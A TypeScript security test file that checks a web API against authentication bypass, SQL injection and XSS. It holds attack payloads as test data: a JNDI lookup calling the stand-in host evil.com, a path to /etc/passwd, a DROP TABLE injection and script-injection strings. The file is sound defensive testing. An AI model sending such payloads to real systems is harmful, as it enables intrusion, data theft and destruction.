// tests/security/penetration/auth-bypass.test.ts
import { describe, it, expect } from 'vitest';
import request from 'supertest';
import { app } from '@server/index';

describe('Authentication Security Tests', () => {
  describe('Token Bypass Attempts', () => {
    it('should reject malformed tokens', async () => {
      const malformedTokens = [
        'Bearer invalid',
        'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid',
        'Bearer ../../../etc/passwd',
        'Bearer <script>alert("xss")</script>',
        'Bearer ${jndi:ldap://evil.com/a}'
      ];

      for (const token of malformedTokens) {
        await request(app)
          .get('/api/rooms')
          .set('Authorization', token)
          .expect(401);
      }
    });

    it('should prevent SQL injection in user ID', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' UNION SELECT * FROM users --"
      ];

      for (const payload of sqlInjectionPayloads) {
        await request(app)
          .get(`/api/users/${encodeURIComponent(payload)}`)
          .set('Authorization', 'Bearer valid-token')
          .expect(res => {
            // Should not return sensitive data or cause errors
            expect(res.status).not.toBe(500);
            expect(res.body).not.toHaveProperty('password');
          });
      }
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize user input in room names', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '"><script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src=x onerror=alert("xss")>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/rooms')
          .set('Authorization', 'Bearer valid-token')
          .send({ name: payload })
          .expect(201);

        // Verify the response doesn't contain executable scripts
        expect(response.body.data.name).not.toContain('<script>');
        expect(response.body.data.name).not.toContain('javascript:');
      }
    });
  });
});
